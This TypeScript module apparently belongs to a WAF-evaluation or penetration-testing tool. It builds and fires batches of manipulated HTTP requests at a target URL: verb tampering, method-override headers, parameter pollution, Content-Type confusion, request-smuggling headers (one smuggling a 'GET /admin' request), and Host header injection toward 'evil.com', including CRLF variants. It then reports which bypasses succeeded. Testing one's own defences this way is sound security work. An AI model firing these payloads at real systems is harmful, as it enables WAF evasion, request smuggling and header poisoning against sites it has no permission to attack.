// HTTP Protocol Manipulation Module
// Advanced techniques for bypassing WAF through HTTP protocol manipulation
// Includes Verb Tampering, Parameter Pollution, Content-Type confusion

import { isValidTargetUrl } from "./utils/security";

export interface HTTPManipulationOptions {
	enableVerbTampering?: boolean;
	enableParameterPollution?: boolean;
	enableContentTypeConfusion?: boolean;
	enableRequestSmuggling?: boolean;
	enableHostHeaderInjection?: boolean;
}

export interface ManipulatedRequest {
	method: string;
	url: string;
	headers: Record<string, string>;
	body?: string;
	technique: string;
	description: string;
}

export class HTTPManipulator {
	/**
	 * Get uncommon HTTP methods for testing
	 */
	static getUncommonMethods(): string[] {
		return ['PATCH', 'TRACE', 'OPTIONS', 'HEAD', 'PROPFIND', 'REPORT', 'LOCK', 'UNLOCK', 'MOVE', 'COPY'];
	}

	/**
	 * Generate HTTP method overrides via headers
	 */
	static generateMethodOverrides(baseMethod: string, targetMethod: string): Record<string, string>[] {
		return [
			{ 'X-HTTP-Method': targetMethod },
			{ 'X-HTTP-Method-Override': targetMethod },
			{ 'X-Method-Override': targetMethod },
			{ 'X-HTTP-Method-Overriding': targetMethod },
		];
	}

	/**
	 * Generate parameter pollution variations
	 */
	static generateParameterPollution(paramName: string, payload: string): string[] {
		return [
			`${paramName}=${encodeURIComponent(payload)}&${paramName}=safe`,
			`${paramName}=safe&${paramName}=${encodeURIComponent(payload)}`,
			`${paramName}[]=${encodeURIComponent(payload)}`,
			`${paramName}[val]=${encodeURIComponent(payload)}`,
		];
	}

	/**
	 * Get Content-Type variations for testing
	 */
	static getContentTypeVariations(): Record<string, string>[] {
		return [
			{ 'Content-Type': 'application/x-www-form-urlencoded' },
			{ 'Content-Type': 'application/json' },
			{ 'Content-Type': 'text/xml' },
			{ 'Content-Type': 'application/xml' },
			{ 'Content-Type': 'multipart/form-data; boundary=something' },
			{ 'Content-Type': 'text/plain' },
			{ 'Content-Type': 'application/x-protobuf' },
		];
	}

	/**
	 * Generate request smuggling payloads
	 */
	static generateRequestSmugglingHeaders(): Record<string, string>[] {
		return [
			// Transfer-Encoding variations
			{ 'Transfer-Encoding': 'chunked' },
			{ 'Transfer-Encoding': 'chunked\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com' },
			{ 'transfer-encoding': 'chunked' }, // Lowercase
			{ 'Transfer-Encoding': ' chunked' }, // Leading space
			{ 'Transfer-Encoding': 'chunked ' }, // Trailing space
			{ 'Transfer-Encoding': 'chunked\x00' }, // Null byte

			// Content-Length conflicts
			{ 'Content-Length': '0', 'Transfer-Encoding': 'chunked' },
			{ 'Content-Length': '5', 'Transfer-Encoding': 'chunked' },

			// Double headers
			{ 'Content-Length': '0', 'content-length': '100' },
			{ 'Transfer-Encoding': 'chunked', 'transfer-encoding': 'identity' },

			// HTTP/1.1 vs HTTP/1.0 confusion
			{ Connection: 'keep-alive', 'Transfer-Encoding': 'chunked' },
			{ Connection: 'close', 'Content-Length': '0' },
		];
	}

	/**
	 * Generate Host header injection variations
	 */
	static generateHostHeaderVariations(originalHost: string, injectedHost: string): Record<string, string>[] {
		return [
			// Basic host header injection
			{ Host: injectedHost },

			// Multiple host headers
			{ Host: originalHost, host: injectedHost },

			// Host override headers
			{ Host: originalHost, 'X-Forwarded-Host': injectedHost },
			{ Host: originalHost, 'X-Original-Host': injectedHost },
			{ Host: originalHost, 'X-Host': injectedHost },
			{ Host: originalHost, 'X-Forwarded-Server': injectedHost },

			// Port confusion
			{ Host: `${originalHost}:80@${injectedHost}` },
			{ Host: `${injectedHost}:80` },

			// URL confusion
			{ Host: `${originalHost}\\\@${injectedHost}` },
			{ Host: `${originalHost}.${injectedHost}` },

			// CRLF injection in Host header
			{ Host: `${originalHost}\r\nX-Injected-Header: ${injectedHost}` },
			{ Host: `${originalHost}%0d%0aX-Injected-Header: ${injectedHost}` },

			// Unicode variations
			{ Host: `${originalHost}\\u002e${injectedHost}` },

			// Absolute URL in Host header
			{ Host: `http://${injectedHost}` },
			{ Host: `https://${injectedHost}` },
		];
	}

	/**
	 * Generate manipulated requests for testing
	 */
	static generateManipulatedRequests(
		originalUrl: string,
		originalMethod: string = 'GET',
		payload: string = 'test',
		options: HTTPManipulationOptions = {},
	): ManipulatedRequest[] {
		const requests: ManipulatedRequest[] = [];
		const parsedUrl = new URL(originalUrl);

		// HTTP Verb Tampering
		if (options.enableVerbTampering !== false) {
			// Standard methods first
			const standardMethods = ['GET', 'POST', 'PUT', 'DELETE'];
			standardMethods.forEach((method) => {
				requests.push({
					method,
					url: originalUrl,
					headers: {},
					technique: 'HTTP Verb Tampering',
					description: `Standard HTTP method: ${method}`,
				});
			});

			// Uncommon methods
			const uncommonMethods = this.getUncommonMethods();
			uncommonMethods.forEach((method) => {
				requests.push({
					method,
					url: originalUrl,
					headers: {},
					technique: 'HTTP Verb Tampering',
					description: `Uncommon HTTP method: ${method}`,
				});
			});

			// Method override techniques — test multiple target methods via override headers
			const baseMethods = ['GET', 'POST'];
			const targetMethods = ['POST', 'PUT', 'DELETE', 'PATCH'];
			for (const baseMethod of baseMethods) {
				for (const targetMethod of targetMethods) {
					if (baseMethod === targetMethod) continue;
					const overrides = this.generateMethodOverrides(baseMethod, targetMethod);
					overrides.forEach((headers) => {
						const headerName = Object.keys(headers)[0];
						requests.push({
							method: baseMethod,
							url: originalUrl,
							headers,
							technique: 'HTTP Method via Header',
							description: `${baseMethod} → ${targetMethod} via ${headerName}`,
						});
					});
				}
			}
		}

		// Parameter Pollution
		if (options.enableParameterPollution !== false) {
			const pollutionVariations = this.generateParameterPollution('test', payload);
			pollutionVariations.forEach((queryString, index) => {
				const manipulatedUrl = `${parsedUrl.origin}${parsedUrl.pathname}?${queryString}`;
				requests.push({
					method: 'GET',
					url: manipulatedUrl,
					headers: {},
					technique: 'Parameter Pollution',
					description: `Parameter pollution variation #${index + 1}`,
				});
			});
		}

		// Content-Type Confusion
		if (options.enableContentTypeConfusion !== false) {
			const contentTypes = this.getContentTypeVariations();
			contentTypes.forEach((headers) => {
				requests.push({
					method: 'POST',
					url: originalUrl,
					headers,
					body: `test=${encodeURIComponent(payload)}`,
					technique: 'Content-Type Confusion',
					description: `Content-Type manipulation: ${headers['Content-Type'] || headers['content-type']}`,
				});
			});
		}

		// Request Smuggling
		if (options.enableRequestSmuggling !== false) {
			const smugglingHeaders = this.generateRequestSmugglingHeaders();
			smugglingHeaders.forEach((headers) => {
				requests.push({
					method: 'POST',
					url: originalUrl,
					headers,
					body: 'test=smuggled',
					technique: 'HTTP Request Smuggling',
					description: `Request smuggling using: ${Object.keys(headers).join(', ')}`,
				});
			});
		}

		// Host Header Injection
		if (options.enableHostHeaderInjection !== false) {
			const hostVariations = this.generateHostHeaderVariations(parsedUrl.host, 'evil.com');
			hostVariations.forEach((headers) => {
				requests.push({
					method: 'GET',
					url: originalUrl,
					headers,
					technique: 'Host Header Injection',
					description: `Host header manipulation: ${headers.Host || headers.host}`,
				});
			});
		}

		return requests;
	}

	/**
	 * Execute manipulated request
	 */
	static async executeManipulatedRequest(
		request: ManipulatedRequest,
		followRedirects: boolean = false,
	): Promise<{
		status: number | string;
		method: string;
		responseTime: number;
		headers: Record<string, string>;
		technique: string;
		description: string;
		error?: string;
	}> {
		const startTime = Date.now();

		try {
			// Validate target URL to prevent SSRF
			if (!isValidTargetUrl(request.url)) {
				return {
					status: 'BLOCKED',
					method: request.method,
					responseTime: Date.now() - startTime,
					headers: {},
					technique: request.technique,
					description: request.description,
					error: 'SSRF protection: Invalid target URL'
				};
			}

			let currentUrl = request.url;
			let redirectCount = 0;
			const maxRedirects = 5;
			let response: Response;

			while (true) {
				response = await fetch(currentUrl, {
					method: redirectCount === 0 ? request.method : 'GET',
					headers: new Headers(redirectCount === 0 ? request.headers : {}),
					body: redirectCount === 0 ? request.body : undefined,
					redirect: 'manual',
				});

				if (followRedirects && response.status >= 300 && response.status < 400 && redirectCount < maxRedirects) {
					const location = response.headers.get('Location');
					if (!location) break;

					const nextUrl = new URL(location, currentUrl).toString();
					if (!isValidTargetUrl(nextUrl)) {
						return {
							status: 'BLOCKED',
							method: request.method,
							responseTime: Date.now() - startTime,
							headers: {},
							technique: request.technique,
							description: request.description,
							error: 'SSRF protection: Blocked redirect to internal IP'
						};
					}
					currentUrl = nextUrl;
					redirectCount++;
					continue;
				}
				break;
			}

			const responseTime = Date.now() - startTime;
			const responseHeaders: Record<string, string> = {};
			response.headers.forEach((value, key) => {
				responseHeaders[key] = value;
			});

			return {
				status: response.status,
				method: request.method,
				responseTime,
				headers: responseHeaders,
				technique: request.technique,
				description: request.description,
			};
		} catch (error: any) {
			const responseTime = Date.now() - startTime;
			const errorMessage = error instanceof Error ? error.message : String(error);

			// Attempt to categorize the error
			let status: number | string = 'ERR';
			if (errorMessage.toLowerCase().includes('connection')) {
				status = 'Network Error';
			} else if (errorMessage.toLowerCase().includes('method') || errorMessage.toLowerCase().includes('protocol')) {
				status = 'Blocked (Client)';
			}

			return {
				status,
				method: request.method,
				responseTime,
				headers: {},
				technique: request.technique,
				description: request.description,
				error: errorMessage,
			};
		}
	}

	/**
	 * Batch execute multiple manipulated requests
	 */
	static async batchExecuteRequests(
		requests: ManipulatedRequest[],
		followRedirects: boolean = false,
		concurrency: number = 5,
		delay: number = 0,
	): Promise<any[]> {
		const results = new Array(requests.length);
		let currentIndex = 0;

		// Worker function to process requests from the queue
		const worker = async () => {
			while (currentIndex < requests.length) {
				const index = currentIndex++;
				if (index >= requests.length) break;

				results[index] = await this.executeManipulatedRequest(requests[index], followRedirects);

				// Optional delay between requests to be respectful
				if (delay > 0 && currentIndex < requests.length) {
					await new Promise((resolve) => setTimeout(resolve, delay));
				}
			}
		};

		// Start workers
		const workers = [];
		const numWorkers = Math.min(concurrency, requests.length);
		for (let i = 0; i < numWorkers; i++) {
			workers.push(worker());
		}

		await Promise.all(workers);
		return results;
	}

	/**
	 * Analyze results for bypass opportunities
	 */
	static analyzeResults(results: any[]): {
		successfulTechniques: string[];
		suspiciousTechniques: string[];
		recommendations: string[];
	} {
		const successful = results.filter(
			(r) => typeof r.status === 'number' && ((r.status >= 200 && r.status < 300) || (r.status >= 500 && r.status < 600)),
		);

		const blocked = results.filter((r) => r.status === 403);
		const suspicious = results.filter((r) => typeof r.status === 'number' && r.status >= 400 && r.status < 500 && r.status !== 403);

		const successfulTechniques = [...new Set(successful.map((r) => r.technique))];
		const suspiciousTechniques = [...new Set(suspicious.map((r) => r.technique))];

		const recommendations = [];

		if (successfulTechniques.length > 0) {
			recommendations.push(`✅ ${successfulTechniques.length} bypass techniques worked: ${successfulTechniques.join(', ')}`);
		}

		if (suspiciousTechniques.length > 0) {
			recommendations.push(`⚠️ ${suspiciousTechniques.length} techniques returned non-403 errors: ${suspiciousTechniques.join(', ')}`);
		}

		if (blocked.length === results.length) {
			recommendations.push('🛡️ All requests were blocked (403) - WAF is working effectively');
		} else if (blocked.length > 0) {
			recommendations.push(`🔄 ${blocked.length}/${results.length} requests blocked - partial protection`);
		}

		return {
			successfulTechniques,
			suspiciousTechniques,
			recommendations,
		};
	}
}
